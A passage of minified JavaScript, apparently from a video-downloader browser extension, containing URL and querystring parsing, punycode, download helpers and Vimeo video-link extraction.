f,d,h,p,m=e[l].replace(s,"%20"),v=m.indexOf(r);v>=0?(f=m.substr(0,v),d=m.substr(v+1)):(f=m,d=""),h=decodeURIComponent(f),p=decodeURIComponent(d),n(a,h)?o(a[h])?a[h].push(p):a[h]=[a[h],p]:a[h]=p}return a};var o=Array.isArray||function(e){return"[object Array]"===Object.prototype.toString.call(e)}},function(e,t,r){"use strict";var n=function(e){switch(typeof e){case"string":return e;case"boolean":return e?"true":"false";case"number":return isFinite(e)?e:"";default:return""}};e.exports=function(e,t,r,s){return t=t||"&",r=r||"=",null===e&&(e=void 0),"object"==typeof e?i(a(e),function(a){var s=encodeURIComponent(n(a))+r;return o(e[a])?i(e[a],function(e){return s+encodeURIComponent(n(e))}).join(t):s+encodeURIComponent(n(e[a]))}).join(t):s?encodeURIComponent(n(s))+r+encodeURIComponent(n(e)):""};var o=Array.isArray||function(e){return"[object Array]"===Object.prototype.toString.call(e)};function i(e,t){if(e.map)return e.map(t);for(var r=[],n=0;n<e.length;n++)r.push(t(e[n],n));return r}var a=Object.keys||function(e){var t=[];for(var r in e)Object.prototype.hasOwnProperty.call(e,r)&&t.push(r);return t}},function(e,t){e.exports=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],function(){})),!0}catch(e){return!1}},e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t,r){"use strict";var n=r(34),o=r(37);function i(){this.protocol=null,this.slashes=null,this.auth=null,this.host=null,this.port=null,this.hostname=null,this.hash=null,this.search=null,this.query=null,this.pathname=null,this.path=null,this.href=null}t.parse=b,t.resolve=function(e,t){return b(e,!1,!0).resolve(t)},t.resolveObject=function(e,t){return e?b(e,!1,!0).resolveObject(t):t},t.format=function(e){return o.isString(e)&&(e=b(e)),e instanceof i?e.format():i.prototype.format.call(e)},t.Url=i;var a=/^([a-z0-9.+-]+:)/i,s=/:[0-9]*$/,u=/^(\/\/?(?!\/)[^\?\s]*)(\?[^\s]*)?$/,c=["{","}","|","\\","^","`"].concat(["<",">",'"',"`"," ","\r","\n","\t"]),l=["'"].concat(c),f=["%","/","?",";","#"].concat(l),d=["/","?","#"],h=/^[+a-z0-9A-Z_-]{0,63}$/,p=/^([+a-z0-9A-Z_-]{0,63})(.*)$/,m={javascript:!0,"javascript:":!0},v={javascript:!0,"javascript:":!0},y={http:!0,https:!0,ftp:!0,gopher:!0,file:!0,"http:":!0,"https:":!0,"ftp:":!0,"gopher:":!0,"file:":!0},g=r(9);function b(e,t,r){if(e&&o.isObject(e)&&e instanceof i)return e;var n=new i;return n.parse(e,t,r),n}i.prototype.parse=function(e,t,r){if(!o.isString(e))throw new TypeError("Parameter 'url' must be a string, not "+typeof e);var i=e.indexOf("?"),s=-1!==i&&i<e.indexOf("#")?"?":"#",c=e.split(s);c[0]=c[0].replace(/\\/g,"/");var b=e=c.join(s);if(b=b.trim(),!r&&1===e.split("#").length){var w=u.exec(b);if(w)return this.path=b,this.href=b,this.pathname=w[1],w[2]?(this.search=w[2],this.query=t?g.parse(this.search.substr(1)):this.search.substr(1)):t&&(this.search="",this.query={}),this}var x=a.exec(b);if(x){var k=(x=x[0]).toLowerCase();this.protocol=k,b=b.substr(x.length)}if(r||x||b.match(/^\/\/[^@\/]+@[^@\/]+/)){var O="//"===b.substr(0,2);!O||x&&v[x]||(b=b.substr(2),this.slashes=!0)}if(!v[x]&&(O||x&&!y[x])){for(var j,L,S=-1,C=0;C<d.length;C++)-1!==(E=b.indexOf(d[C]))&&(-1===S||E<S)&&(S=E);for(-1!==(L=-1===S?b.lastIndexOf("@"):b.lastIndexOf("@",S))&&(j=b.slice(0,L),b=b.slice(L+1),this.auth=decodeURIComponent(j)),S=-1,C=0;C<f.length;C++){var E;-1!==(E=b.indexOf(f[C]))&&(-1===S||E<S)&&(S=E)}-1===S&&(S=b.length),this.host=b.slice(0,S),b=b.slice(S),this.parseHost(),this.hostname=this.hostname||"";var M="["===this.hostname[0]&&"]"===this.hostname[this.hostname.length-1];if(!M)for(var I=this.hostname.split(/\./),A=(C=0,I.length);C<A;C++){var R=I[C];if(R&&!R.match(h)){for(var V="",_=0,T=R.length;_<T;_++)R.charCodeAt(_)>127?V+="x":V+=R[_];if(!V.match(h)){var P=I.slice(0,C),F=I.slice(C+1),D=R.match(p);D&&(P.push(D[1]),F.unshift(D[2])),F.length&&(b="/"+F.join(".")+b),this.hostname=P.join(".");break}}}this.hostname.length>255?this.hostname="":this.hostname=this.hostname.toLowerCase(),M||(this.hostname=n.toASCII(this.hostname));var U=this.port?":"+this.port:"",q=this.hostname||"";this.host=q+U,this.href+=this.host,M&&(this.hostname=this.hostname.substr(1,this.hostname.length-2),"/"!==b[0]&&(b="/"+b))}if(!m[k])for(C=0,A=l.length;C<A;C++){var N=l[C];if(-1!==b.indexOf(N)){var B=encodeURIComponent(N);B===N&&(B=escape(N)),b=b.split(N).join(B)}}var H=b.indexOf("#");-1!==H&&(this.hash=b.substr(H),b=b.slice(0,H));var $=b.indexOf("?");if(-1!==$?(this.search=b.substr($),this.query=b.substr($+1),t&&(this.query=g.parse(this.query)),b=b.slice(0,$)):t&&(this.search="",this.query={}),b&&(this.pathname=b),y[k]&&this.hostname&&!this.pathname&&(this.pathname="/"),this.pathname||this.search){U=this.pathname||"";var G=this.search||"";this.path=U+G}return this.href=this.format(),this},i.prototype.format=function(){var e=this.auth||"";e&&(e=(e=encodeURIComponent(e)).replace(/%3A/i,":"),e+="@");var t=this.protocol||"",r=this.pathname||"",n=this.hash||"",i=!1,a="";this.host?i=e+this.host:this.hostname&&(i=e+(-1===this.hostname.indexOf(":")?this.hostname:"["+this.hostname+"]"),this.port&&(i+=":"+this.port)),this.query&&o.isObject(this.query)&&Object.keys(this.query).length&&(a=g.stringify(this.query));var s=this.search||a&&"?"+a||"";return t&&":"!==t.substr(-1)&&(t+=":"),this.slashes||(!t||y[t])&&!1!==i?(i="//"+(i||""),r&&"/"!==r.charAt(0)&&(r="/"+r)):i||(i=""),n&&"#"!==n.charAt(0)&&(n="#"+n),s&&"?"!==s.charAt(0)&&(s="?"+s),t+i+(r=r.replace(/[?#]/g,function(e){return encodeURIComponent(e)}))+(s=s.replace("#","%23"))+n},i.prototype.resolve=function(e){return this.resolveObject(b(e,!1,!0)).format()},i.prototype.resolveObject=function(e){if(o.isString(e)){var t=new i;t.parse(e,!1,!0),e=t}for(var r=new i,n=Object.keys(this),a=0;a<n.length;a++){var s=n[a];r[s]=this[s]}if(r.hash=e.hash,""===e.href)return r.href=r.format(),r;if(e.slashes&&!e.protocol){for(var u=Object.keys(e),c=0;c<u.length;c++){var l=u[c];"protocol"!==l&&(r[l]=e[l])}return y[r.protocol]&&r.hostname&&!r.pathname&&(r.path=r.pathname="/"),r.href=r.format(),r}if(e.protocol&&e.protocol!==r.protocol){if(!y[e.protocol]){for(var f=Object.keys(e),d=0;d<f.length;d++){var h=f[d];r[h]=e[h]}return r.href=r.format(),r}if(r.protocol=e.protocol,e.host||v[e.protocol])r.pathname=e.pathname;else{for(var p=(e.pathname||"").split("/");p.length&&!(e.host=p.shift()););e.host||(e.host=""),e.hostname||(e.hostname=""),""!==p[0]&&p.unshift(""),p.length<2&&p.unshift(""),r.pathname=p.join("/")}if(r.search=e.search,r.query=e.query,r.host=e.host||"",r.auth=e.auth,r.hostname=e.hostname||e.host,r.port=e.port,r.pathname||r.search){var m=r.pathname||"",g=r.search||"";r.path=m+g}return r.slashes=r.slashes||e.slashes,r.href=r.format(),r}var b=r.pathname&&"/"===r.pathname.charAt(0),w=e.host||e.pathname&&"/"===e.pathname.charAt(0),x=w||b||r.host&&e.pathname,k=x,O=r.pathname&&r.pathname.split("/")||[],j=(p=e.pathname&&e.pathname.split("/")||[],r.protocol&&!y[r.protocol]);if(j&&(r.hostname="",r.port=null,r.host&&(""===O[0]?O[0]=r.host:O.unshift(r.host)),r.host="",e.protocol&&(e.hostname=null,e.port=null,e.host&&(""===p[0]?p[0]=e.host:p.unshift(e.host)),e.host=null),x=x&&(""===p[0]||""===O[0])),w)r.host=e.host||""===e.host?e.host:r.host,r.hostname=e.hostname||""===e.hostname?e.hostname:r.hostname,r.search=e.search,r.query=e.query,O=p;else if(p.length)O||(O=[]),O.pop(),O=O.concat(p),r.search=e.search,r.query=e.query;else if(!o.isNullOrUndefined(e.search))return j&&(r.hostname=r.host=O.shift(),(M=!!(r.host&&r.host.indexOf("@")>0)&&r.host.split("@"))&&(r.auth=M.shift(),r.host=r.hostname=M.shift())),r.search=e.search,r.query=e.query,o.isNull(r.pathname)&&o.isNull(r.search)||(r.path=(r.pathname?r.pathname:"")+(r.search?r.search:"")),r.href=r.format(),r;if(!O.length)return r.pathname=null,r.search?r.path="/"+r.search:r.path=null,r.href=r.format(),r;for(var L=O.slice(-1)[0],S=(r.host||e.host||O.length>1)&&("."===L||".."===L)||""===L,C=0,E=O.length;E>=0;E--)"."===(L=O[E])?O.splice(E,1):".."===L?(O.splice(E,1),C++):C&&(O.splice(E,1),C--);if(!x&&!k)for(;C--;C)O.unshift("..");!x||""===O[0]||O[0]&&"/"===O[0].charAt(0)||O.unshift(""),S&&"/"!==O.join("/").substr(-1)&&O.push("");var M,I=""===O[0]||O[0]&&"/"===O[0].charAt(0);return j&&(r.hostname=r.host=I?"":O.length?O.shift():"",(M=!!(r.host&&r.host.indexOf("@")>0)&&r.host.split("@"))&&(r.auth=M.shift(),r.host=r.hostname=M.shift())),(x=x||r.host&&O.length)&&!I&&O.unshift(""),O.length?r.pathname=O.join("/"):(r.pathname=null,r.path=null),o.isNull(r.pathname)&&o.isNull(r.search)||(r.path=(r.pathname?r.pathname:"")+(r.search?r.search:"")),r.auth=e.auth||r.auth,r.slashes=r.slashes||e.slashes,r.href=r.format(),r},i.prototype.parseHost=function(){var e=this.host,t=s.exec(e);t&&(":"!==(t=t[0])&&(this.port=t.substr(1)),e=e.substr(0,e.length-t.length)),e&&(this.hostname=e)}},function(e,t,r){(function(e,n){var o;!function(i){t&&t.nodeType,e&&e.nodeType;var a="object"==typeof n&&n;a.global!==a&&a.window!==a&&a.self;var s,u=2147483647,c=/^xn--/,l=/[^\x20-\x7E]/,f=/[\x2E\u3002\uFF0E\uFF61]/g,d={overflow:"Overflow: input needs wider integers to process","not-basic":"Illegal input >= 0x80 (not a basic code point)","invalid-input":"Invalid input"},h=Math.floor,p=String.fromCharCode;function m(e){throw new RangeError(d[e])}function v(e,t){for(var r=e.length,n=[];r--;)n[r]=t(e[r]);return n}function y(e,t){var r=e.split("@"),n="";return r.length>1&&(n=r[0]+"@",e=r[1]),n+v((e=e.replace(f,".")).split("."),t).join(".")}function g(e){for(var t,r,n=[],o=0,i=e.length;o<i;)(t=e.charCodeAt(o++))>=55296&&t<=56319&&o<i?56320==(64512&(r=e.charCodeAt(o++)))?n.push(((1023&t)<<10)+(1023&r)+65536):(n.push(t),o--):n.push(t);return n}function b(e){return v(e,function(e){var t="";return e>65535&&(t+=p((e-=65536)>>>10&1023|55296),e=56320|1023&e),t+p(e)}).join("")}function w(e,t){return e+22+75*(e<26)-((0!=t)<<5)}function x(e,t,r){var n=0;for(e=r?h(e/700):e>>1,e+=h(e/t);e>455;n+=36)e=h(e/35);return h(n+36*e/(e+38))}function k(e){var t,r,n,o,i,a,s,c,l,f,d,p=[],v=e.length,y=0,g=128,w=72;for((r=e.lastIndexOf("-"))<0&&(r=0),n=0;n<r;++n)e.charCodeAt(n)>=128&&m("not-basic"),p.push(e.charCodeAt(n));for(o=r>0?r+1:0;o<v;){for(i=y,a=1,s=36;o>=v&&m("invalid-input"),((c=(d=e.charCodeAt(o++))-48<10?d-22:d-65<26?d-65:d-97<26?d-97:36)>=36||c>h((u-y)/a))&&m("overflow"),y+=c*a,!(c<(l=s<=w?1:s>=w+26?26:s-w));s+=36)a>h(u/(f=36-l))&&m("overflow"),a*=f;w=x(y-i,t=p.length+1,0==i),h(y/t)>u-g&&m("overflow"),g+=h(y/t),y%=t,p.splice(y++,0,g)}return b(p)}function O(e){var t,r,n,o,i,a,s,c,l,f,d,v,y,b,k,O=[];for(v=(e=g(e)).length,t=128,r=0,i=72,a=0;a<v;++a)(d=e[a])<128&&O.push(p(d));for(n=o=O.length,o&&O.push("-");n<v;){for(s=u,a=0;a<v;++a)(d=e[a])>=t&&d<s&&(s=d);for(s-t>h((u-r)/(y=n+1))&&m("overflow"),r+=(s-t)*y,t=s,a=0;a<v;++a)if((d=e[a])<t&&++r>u&&m("overflow"),d==t){for(c=r,l=36;!(c<(f=l<=i?1:l>=i+26?26:l-i));l+=36)k=c-f,b=36-f,O.push(p(w(f+k%b,0))),c=h(k/b);O.push(p(w(c,0))),i=x(r,y,n==o),r=0,++n}++r,++t}return O.join("")}s={version:"1.4.1",ucs2:{decode:g,encode:b},decode:k,encode:O,toASCII:function(e){return y(e,function(e){return l.test(e)?"xn--"+O(e):e})},toUnicode:function(e){return y(e,function(e){return c.test(e)?k(e.slice(4).toLowerCase()):e})}},void 0===(o=function(){return s}.call(t,r,t,e))||(e.exports=o)}()}).call(this,r(35)(e),r(36))},function(e,t){e.exports=function(e){return e.webpackPolyfill||(e.deprecate=function(){},e.paths=[],e.children||(e.children=[]),Object.defineProperty(e,"loaded",{enumerable:!0,get:function(){return e.l}}),Object.defineProperty(e,"id",{enumerable:!0,get:function(){return e.i}}),e.webpackPolyfill=1),e}},function(e,t){var r;r=function(){return this}();try{r=r||new Function("return this")()}catch(e){"object"==typeof window&&(r=window)}e.exports=r},function(e,t,r){"use strict";e.exports={isString:function(e){return"string"==typeof e},isObject:function(e){return"object"==typeof e&&null!==e},isNull:function(e){return null===e},isNullOrUndefined:function(e){return null==e}}},function(e,t,r){"use strict";var n=/[|\\{}()[\]^$+*?.]/g;e.exports=function(e){if("string"!=typeof e)throw new TypeError("Expected a string");return e.replace(n,"\\$&")}},function(e,t,r){"use strict";r.r(t),t.default=function(e){e.hasMenuTutorial=!0}},function(e,t,r){"use strict";r.r(t),t.default=function(e){e.errorCatch={onError:function(t){var r=t.filename,n=t.message;r&&n&&(r=(r=String(r).match(/\/([^\/]+)$/))&&r[1])&&(t.lineno&&(r+=":"+t.lineno),"_generated_background_page.html:1"!==r&&e.actionList.trackError({desc:[r,n].join(" ")}))},enable:function(){window.addEventListener&&window.addEventListener("error",this.onError)},disable:function(){window.removeEventListener&&window.removeEventListener("error",this.onError)}},e.errorCatch.enable()}},function(e,t,r){"use strict";function n(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function o(e,t,r,n,o,i,a){try{var s=e[i](a),u=s.value}catch(e){return void r(e)}s.done?t(u):Promise.resolve(u).then(n,o)}function i(e){return function(){var t=this,r=arguments;return new Promise(function(n,i){var a=e.apply(t,r);function s(e){o(a,n,i,s,u,"next",e)}function u(e){o(a,n,i,s,u,"throw",e)}s(void 0)})}}r.r(t);var a=r(17),s=r(18),u=r(12),c=r(19);function l(e){return a(e)||s(e)||u(e)||c()}var f=r(3),d=r.n(f),h=r(0),p=r(4),m=r(5);function v(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter(function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable})),r.push.apply(r,n)}return r}var y=Object(m.a)("utils"),g=null,b={getFileSize:function(e,t){var r=e.url,o=e.requestOptions,i=void 0===o?{}:o,a={fileSize:0,fileType:"",status:0,error:!1};return Object(p.a)(function(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?v(Object(r),!0).forEach(function(t){n(e,t,r[t])}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):v(Object(r)).forEach(function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))})}return e}({url:r,type:"HEAD"},i),function(e,r){if(e)return a.error=!0,t(a);a.status=r.statusCode,a.fileSize=parseInt(r.headers["content-length"])||0;var n=r.headers["content-type"];n&&(a.fileType=n),t(a)}),!0},ChromeDl:function(){var e={},t=!1,r=function(r){e[r]&&delete e[r],0===Object.keys(e).length&&(t=!1,chrome.downloads.onChanged.removeListener(n))},n=function(t){var n=e[t.id];if(n){var o=!1;n.fixNetworkFiled&&(o=function(e,t){var r=parseInt(Date.now()/1e3),n=!1;e.lastFix||(e.lastFix=0),e.lastFix+5<r&&(e.lastFix=r,n=!0);var o=t.state&&"interrupted"===t.state.current,i=t.error&&"NETWORK_FAILED"===t.error.current,a=t.canResume&&t.canResume.current;return o&&i&&a||(n=!1),n}(n,t)),o?chrome.downloads.resume(t.id):t.state&&-1!==["interrupted","complete"].indexOf(t.state.current)&&r(t.id)}};this.download=function(r){var o=r.url,i=r.filename;r.fixNetworkFiled=/(vk\.me|userapi\.com)\/.+\.mp4/i.test(o);var a={url:o,filename:i},s=g.preferences||g.storage||{};h.a.isFirefox&&s.saveAsDialog&&(a.saveAs=!0),chrome.downloads.download(a,function(o){r.fixNetworkFiled&&(function(t,r){e[t]||(e[t]=r)}(o,r),t||(t=!0,chrome.downloads.onChanged.addListener(n)))})}},chromeDownload:null,downloadFile:function(e){var t=g.preferences.sortDownloads;if(t&&t.isEnabled){var r=e.options.filename.slice(e.options.filename.lastIndexOf(".")+1),n=t.groups.find(function(e){return e.formats.some(function(e){return-1!==e.indexOf(r)})});n&&n.dir&&(e.options.filename="".concat(n.dir,"/").concat(e.options.filename))}var o=b;if(h.a.isChrome||h.a.isFirefox){o.chromeDownload||(o.chromeDownload=new o.ChromeDl);var i=function(){return o.chromeDownload.download(e.options)};if(chrome.downloads&&chrome.downloads.download)return i();chrome.permissions&&chrome.permissions.request?chrome.permissions.request({permissions:["downloads"]},function(e){if(e)return i();y.error("Permissions not granted!")}):y.error("Method in not supported!")}else h.a.isGM&&GM_download(e.options.url,e.options.filename)},chromeListDownload:function(e,t){var r=null;e=e.map(function(e){return{url:e.url,filename:t+e.filename}});var n=function(e){if(e.id===r&&e.state)return-1!==["interrupted","complete"].indexOf(e.state.current)?(r=null,i()):void 0};chrome.downloads.onChanged.addListener(n);var o=-1,i=function(){var t=e[++o];if(t)return chrome.downloads.download({url:t.url,filename:t.filename},function(e){r=e});chrome.downloads.onChanged.removeListener(n)};return i()},downloadList:function(e){var t=this,r=e.fileList,n=e.folder;(h.a.isChrome||h.a.isFirefox)&&chrome.downloads&&chrome.downloads.download?t.chromeListDownload(r,n):r.forEach(function(e){t.downloadFile({options:{url:e.url,filename:n+e.filename}})})},getUmmyIcon:function(e,t){t("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAB90lEQVQ4EcVSy2oUURCtqm7HcYgmYDTiYxEEERdZGP0B0UVwEcSv8LHIb4gbQcjGlVtB40YhfkAWuhs0uFOIgjJomiEzztzue4+n7rTgH6SaoqpPnao6fW+LHLapC9hdPHMbKT1UTcsQWxDBnAAdFkuvQ6QR1cD0QAUVoF+0kKdXBoO32j959maK8V1LVDaBDXkwm9q32atz/hmRpIZb5STqPaDIjP/oFAS5Xu1l/MPCBZhxt09uSRykCn1QhmQr1MiSQ3TPGYdIMtwfZPh3MjkhlvOWOcuTrJQB5VJeR0g5HlzjMSSVpp7mtQGFBJjXwJp69AlqtlTW0bpQ6nNLbTdjSCIxNhkOqUBwBconZYWZr1G6RgXcRoI782k0rO681vVq15o6SGyCrFefbHVnS6eNkmcSyMlOvr48ernimjlf5WcUuP1zr7C7W090/twiMcjw+y95dWcjXRr7Sn6Ba8mmB1RQ/MwqOK2mg356FPFi4xGm4z8I40nOT434OanElDdWM2aH/eAtHOlz98XZRBch0uPnHPu4J9uPn+dNzNGTLho/Kj+D1gza12fl1RuEtlmaaWPiGkOK8k0mecB5Nnes8DZvdiwPgRVrmbAp19aI8Fe2ZSDN86aOk9OpkfiHqfKoap9JfMTWfcavvNXN+/H9G596uPYX83AWUVC6/FsAAAAASUVORK5CYII=")},getWarningIcon:function(e,t){var r,n=e.color||"#c2c2c2";r="audio"===e.type?'<svg width="21px" height="24px" viewBox="0 0 21 24" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M21,2.76923077 L21,17.6487288 C21,17.6487288 21,17.6487288 21,17.6487288 L21,18.4615385 L20.9068729,18.4615385 C20.723595,19.2712249 20.2716013,20.0865791 19.5669296,20.7680198 C17.9203537,22.360313 15.5176896,22.6184747 14.2004289,21.3446402 C12.8831682,20.0708056 13.1501309,17.7473503 14.7967068,16.1550571 C16.0602516,14.9331676 17.7690324,14.4969051 19.0909091,14.9356816 L19.0909091,14.9356816 L19.0909091,4.15384615 L7.63636364,6.92307692 L7.63636364,19.4948826 C7.63636364,19.4948826 7.63636364,19.4948826 7.63636364,19.4948826 L7.63636364,20.3076923 L7.5432365,20.3076923 C7.35995859,21.1173788 6.90796493,21.9327329 6.20329323,22.6141737 C4.55671732,24.2064669 2.15405328,24.4646286 0.836792552,23.190794 C-0.480468173,21.9169595 -0.213505501,19.5935041 1.43307041,18.0012109 C2.69661523,16.7793214 4.40539601,16.343059 5.72727273,16.7818354 L5.72727273,16.7818354 L5.72727273,6.46153846 L5.72727273,3.69230769 L21,0 L21,2.76923077 Z" fill="'+n+'"></path></svg>':"playlist"===e.type?'<svg width="24px" height="18px" viewBox="0 0 24 18" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M0,0 L0,3.6 L3.42857143,3.6 L3.42857143,0 L0,0 Z M0,7.2 L0,10.8 L3.42857143,10.8 L3.42857143,7.2 L0,7.2 Z M5.14285714,0 L5.14285714,3.6 L24,3.6 L24,0 L5.14285714,0 Z M5.14285714,7.2 L5.14285714,10.8 L20.5714286,10.8 L20.5714286,7.2 L5.14285714,7.2 Z M0,14.4 L0,18 L3.42857143,18 L3.42857143,14.4 L0,14.4 Z M5.14285714,14.4 L5.14285714,18 L22.2857143,18 L22.2857143,14.4 L5.14285714,14.4 Z" fill="'+n+'"></path></svg>':'<svg width="24px" height="18px" viewBox="0 0 24 18" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M19.5,3 L21.0089096,3 C22.6582294,3 24,4.34288718 24,5.99942248 L24,15.0005775 C24,16.6556493 22.6608432,18 21.0089096,18 L2.99109042,18 C1.34177063,18 0,16.6571128 0,15.0005775 L0,5.99942248 C0,4.34435073 1.33915679,3 2.99109042,3 L7.5,3 C7.5,1.34651712 8.84187067,0 10.497152,0 L16.502848,0 C18.1583772,0 19.5,1.34314575 19.5,3 L19.5,3 Z M13.5,16.5 C16.8137087,16.5 19.5,13.8137087 19.5,10.5 C19.5,7.18629134 16.8137087,4.5 13.5,4.5 C10.1862913,4.5 7.5,7.18629134 7.5,10.5 C7.5,13.8137087 10.1862913,16.5 13.5,16.5 Z M13.5,15 C15.9852815,15 18,12.9852815 18,10.5 C18,8.0147185 15.9852815,6 13.5,6 C11.0147185,6 9,8.0147185 9,10.5 C9,12.9852815 11.0147185,15 13.5,15 Z" fill="'+n+'"></path></svg>',t("data:image/svg+xml;utf8,"+encodeURIComponent(r))},checkUrlsOfOpenTabs:function(e,t){(h.a.isGM?function(e){e([location.href])}:h.a.isChrome?function(e){var t=[];chrome.tabs.query({},function(r){r.forEach(function(e){t.push(e.url)}),e(t)})}:h.a.isFirefox?function(e){var t=[];if(h.a.isFirefoxMobile)return e(t);chrome.tabs.query({},function(r){r.forEach(function(e){t.push(e.url)}),e(t)})}:h.a.isSafari?function(e){var t=[];safari.application&&safari.application.activeBrowserWindow&&safari.application.activeBrowserWindow.tabs&&safari.application.activeBrowserWindow.tabs.forEach(function(e){if(!e.url)return 1;t.push(e.url)}),e(t)}:function(e){e([])})(function(r){var n=[];r.forEach(function(t){e.forEach(function(e){-1!==t.search(e)&&n.push(t)})}),t(n)})},getData:function(e,t){var r=e.url;return r?(Object(p.a)({url:r},function(e,r,n){if(e)return t();t(n)}),!0):t()}},w=r(1),x=r(2),k=function(e,t){t&&!Array.isArray(t)&&(t=[t]);var r=[];return e.replace(/<script(?:\s*|\s[^>]+[^\/])>/g,function(n,o){o+=n.length;var i=e.indexOf("<\/script>",o);if(-1!==i){var a=e.substr(o,i-o);t?t.every(function(e){return e.test(a)})&&r.push(a):r.push(a)}}),r},O=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:[];t&&!Array.isArray(t)&&(t=[t]);for(var r,n=[],o={"{":0,"[":0},i={"}":"{","]":"["},a=/[{}\]\[":0-9.,-]/,s=/[\r\n\s\t]/,u="",c=0;r=e[c];c++)if('"'!==r)a.test(r)?(u+=r,"{"===r||"["===r?(o["{"]||o["["]||(u=r),o[r]++):"}"!==r&&"]"!==r||(o[i[r]]--,o["{"]||o["["]||n.push(u))):"t"===r&&"true"===e.substr(c,4)?(u+="true",c+=3):"f"===r&&"false"===e.substr(c,5)?(u+="false",c+=4):"n"===r&&"null"===e.substr(c,4)?(u+="null",c+=3):s.test(r)||(o["{"]=0,o["["]=0,u="");else{for(var l=c;-1!==l&&(l===c||"\\"===e[l-1]);)l=e.indexOf('"',l+1);-1===l&&(l=e.length-1),u+=e.substr(c,l-c+1),c=l,o["{"]||o["["]||n.push(u)}for(var f=[],d=function(e,r){var o=n[e];if("{}"!==o&&"[]"!==o)try{t.every(function(e){return e.test(o)})&&f.push(JSON.parse(o))}catch(e){}},h=0,p=n.length;h<p;h++)d(h);return f},j=Object(m.a)("VimeoComEmbed"),L=function(){function e(t){Object(w.a)(this,e),this.engine=t}return Object(x.a)(e,[{key:"getVimeoLinks",value:function(e,t){return this._getVimeoLinks(e.extVideoId,e.url,function(r,n,o){var i={action:e.action,extVideoId:e.extVideoId,links:r,title:n,thumb:o};t(i)}),!0}},{key:"_getVimeoLinks",value:function(e,t,r){var n=this;this.getVimeoNoEmbedLinks(e,t,function(t,o,i){if(t)return r(t,o,i);n.getVimeoEmbedLinks(e,r)})}},{key:"getVimeoEmbedLinks",value:function(e,t){var r=this,n=function(){return t(null,"","")};if(!e)return n();Object(p.a)({url:"https://player.vimeo.com/video/"+e},function(e,o,i){if(e||!i)return n();var a=O(i,[/"files":/]),s=null;return a.some(function(e){if(e.video&&e.request&&e.request.files)return s=e,!0}),(i=r.getLinksFromConfig(s))?t(i.links,i.title,i.thumb):n()})}},{key:"getVimeoConfig",value:function(e,t){var r=this,n=function(){return t(null,"","")};Object(p.a)({url:e},function(e,o,i){return e||!i?n():(i=r.getVimeoDataFromConfig(i))?t(i.links,i.title,i.thumb):n()})}},{key:"getVimeoLinksFromConfigAction",value:function(e,t){var r=this;return new Promise(function(t,n){var o=r.getLinksFromConfig(e.config);o?t(o):n(new Error("Get links from config error"))}).then(t,function(e){j.error("getVimeoLinksFromConfigAction error",e),t(null)}),!0}},{key:"getClipPageConfig",value:function(e,t){var r=null;return k(e,/['"]config_url['"]\s*:\s*/).some(function(e){return O(e,/['"]config_url['"]\s*:\s*/).some(function(e){if(e.player&&(r=e.player.config_url))return!0})}),r?this.getVimeoConfig(r,t):t(null,"","")}},{key:"getVimeoNoEmbedLinks",value:function(e,t,r){var n=this;if(e&&t){var o=/vimeo\.com\/[^\/]+\/review\/\d+/i.test(t),i=/vimeo\.com\/\d+\/\w+/i.test(t);o||i||(t=null)}Object(p.a)({url:t||"https://vimeo.com/"+e},function(e,t,o){if(e||!o)return r(null,"","");var i=o.match(/data-config-url=["']([^\s"'<>]+)/i);return(i=i&&i[1].replace(/&amp;/gi,"&"))?n.getVimeoConfig(i,r):n.getClipPageConfig(o,r)})}},{key:"getVimeoLinksFromConfig",value:function(e,t){return t(this.getLinksFromConfig(e.config)||null)}},{key:"getLinksFromConfig",value:function(e){if(!(e&&e.video&&e.request&&e.request.files))return null;var t=e.video,r=e.request.files,n={};n.title=t.title||"";var o=null;for(var i in t.thumbs)(null===o||o<i)&&(o=i,n.thumb=t.thumbs[i]);for(var a in n.links=[],r)Array.isArray(r[a])&&r[a].forEach(function(e){if(e&&e.url&&e.mime){var t=e.mime.split("/")[1];t||(t=(t=e.url.match(/\.(\w{2,4})(?:\?|#|$)/i))&&t[1]||"mp4");var r=t.toUpperCase(),o=e.quality;/^\d+p$/.test(o)&&(o=o.replace(/p$/,""));var i=r+" "+o;n.links.push({url:e.url,name:i,height:o,type:r,format:r,ext:t})}});return n.links.length||(n=null),n}},{key:"getVimeoDataFromConfig",value:function(e){e=e.replace(/(\{|,)\s*(\w+)\s*:/gi,'$1"$2":').replace(/(:\s+)\'/g,'$1"').replace(/\'([,\]\}])/g,'"$1');try{e=JSON.parse(e)}catch(e){return null}return this.getLinksFromConfig(e)}}]),e}(),S=r(7),C=(r(8),r(6),r(15)),E=r(11),M=r(23),I=r(24);function A(e){var t="function"==typeof Map?new Map:void 0;return(A=function(e){if(null===e||!M(e))return e;if("function"!=typeof e)throw new TypeError("Super expression must either be null or a function");if(void 0!==t){if(t.has(e))return t.get(e);t.set(e,r)}function r(){return I(e,arguments,C(this).constructor)}return r.prototype=Object.create(e.prototype,{constructor:{value:r,enumerable:!1,writable:!0,configurable:!0}}),E(r,e)})(e)}var R=function(e){return new Promise(function(t,r){Object(p.a)(e,function(e,n){e?r(e):t(n)})})},V=function(e){if("string"!=typeof e){var t=new Error("Value is not String");throw t.value=e,t}return e},_=function(e){if(!Number.isFinite(e)){var t=new Error("Value is not Finite Number");throw t.value=e,t}return e};function T(e,t){for(var r,n=[];null!==(r=t.exec(e));)r.index===t.lastIndex&&t.lastIndex++,n.push(r);return n}function 